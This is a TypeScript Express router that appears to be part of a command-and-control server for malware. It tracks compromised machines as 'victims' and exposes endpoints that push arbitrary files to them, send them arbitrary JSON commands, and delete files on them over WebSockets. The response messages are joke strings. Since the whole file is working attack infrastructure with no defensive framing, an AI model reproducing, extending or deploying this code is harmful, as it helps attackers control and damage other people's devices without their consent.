import express from 'express';
import * as core from 'express-serve-static-core';
import path from 'path';
import { checkIfValueInJson } from '../../util/util';
import victims, { sendDownloadQueryToVictim } from '../../victims';
import Victim from '../../classes/Victim';

const miscRouter = express.Router();

miscRouter.post("/uploadFile", (req, res) => {
    if(!checkIfValueInJson(req.body, "fileName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "fileContents", res)){
        return;
    }
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
            "messageType": "DOWNLOAD",
            "content": req.body["fileContents"],
            "fileName": req.body["fileName"]
        }));

        setTimeout(() => {
            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
        }, 1000)
        
    }
    res.send({"give nutrient": "no buy my nutrient for $10.99"});
});

miscRouter.post("/sendJSON", (req,res)=> {
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "jsonContent", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify(req.body["jsonContent"]));
    }

    res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
})

miscRouter.post("/deleteFile", (req,res)=> {
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "fileName", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
            "messageType": "DELETE",
            "content": req.body["fileName"]
        }));

        setTimeout(() => {
            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
        }, 1000)
    }

    res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
})

export default miscRouter;